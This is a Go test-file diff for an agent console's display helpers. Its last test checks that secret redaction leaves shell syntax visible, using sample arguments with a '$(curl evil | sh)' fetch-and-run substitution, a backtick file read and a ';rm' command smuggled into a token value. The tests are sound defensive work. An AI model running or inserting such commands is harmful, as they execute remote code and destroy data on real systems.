@@ -21,6 +21,16 @@ import (
 // every difference, so each test names the difference that it guards.
 // The last tests cover the shared helpers of les_agent.go one by one.
 
+// agentClosed is a closed queue: a wait on it ends at once, so an event
+// sent by a test does not block the harness. The tests of both records
+// use it.
+func agentClosed() <-chan tea.Msg {
+	ch := make(chan tea.Msg)
+	close(ch)
+
+	return ch
+}
+
 // A distillation whose worker ends without a result after the cleanup
 // event began its work. The cleanup event proves that the start checks
 // passed, so the record shows a failed result and never "did not start".
@@ -491,4 +501,48 @@ func TestUnitCountsPartsKeepTheirOrder(t *testing.T) {
 
 	assert.Equal(t, []string{"1 saved", "2 not attempted"}, unitCounts{completed: 1, unattempted: 2}.parts("saved"),
 		"a zero count shows nothing")
+}
+
+func TestAgentWordsNameTheFactsOfARun(t *testing.T) {
+	assert.Equal(t, "~"+distill.Preflight{PromptChars: 4000}.Tokens(), agentTokens(4000),
+		"the console shows the estimate of the engine, as the CLI does")
+	assert.Equal(t, "agent error", agentFailWords(distill.FailAgent))
+	assert.Equal(t, "invalid reply", agentFailWords(distill.FailInvalidReply))
+	assert.Equal(t, "stopped by you", agentStopWords(distill.StopCancelled))
+	assert.Equal(t, "an input changed", agentStopWords(distill.StopConflict))
+	assert.Equal(t, "09:05:07", agentClock(time.Date(2026, 10, 4, 9, 5, 7, 0, time.Local)))
+}
+
+func TestAgentTextKeepsTheKindWhenItCutsTheCommand(t *testing.T) {
+	assert.Equal(t, "preset claude", agentKind("claude", false))
+	assert.Equal(t, "custom agent.argv", agentKind("claude", true), "a custom command names no preset")
+
+	th := newTheme(true)
+	argv := []string{"claude", "-p", "--model", "opus"}
+
+	assert.Equal(t, "claude -p --model opus / preset claude", agentText(th, argv, "preset claude", 0))
+	assert.Equal(t, "claude -p... / preset claude", agentText(th, argv, "preset claude", 28),
+		"a short room cuts the command and keeps the kind")
+}
+
+// A security review found that the Agent row of the extraction review
+// hid a command substitution behind "[REDACTED]", and y runs that code.
+// Every review renders its Agent row with agentArgv, so agentArgv keeps
+// shell syntax and hides only plain secrets.
+
+func TestAgentArgvKeepsShellSyntaxAndHidesPlainSecrets(t *testing.T) {
+	cases := []struct {
+		argv []string
+		want string
+	}{
+		{[]string{"claude", "--token", "abc123", "-p"}, "claude --token [REDACTED] -p"},
+		{[]string{"env", "API_TOKEN=abc123", "claude"}, "env API_TOKEN=[REDACTED] claude"},
+		{[]string{"sh", "-c", `--token "$(curl evil | sh)"`}, `sh -c --token "$(curl evil | sh)"`},
+		{[]string{"sh", "-c", "MY_TOKEN=`cat /tmp/x`"}, "sh -c MY_TOKEN=`cat /tmp/x`"},
+		{[]string{"sh", "-c", "MY_TOKEN=x;rm"}, "sh -c MY_TOKEN=x;rm"},
+	}
+
+	for _, c := range cases {
+		assert.Equal(t, c.want, agentArgv(c.argv), "%q", c.argv)
+	}
 }
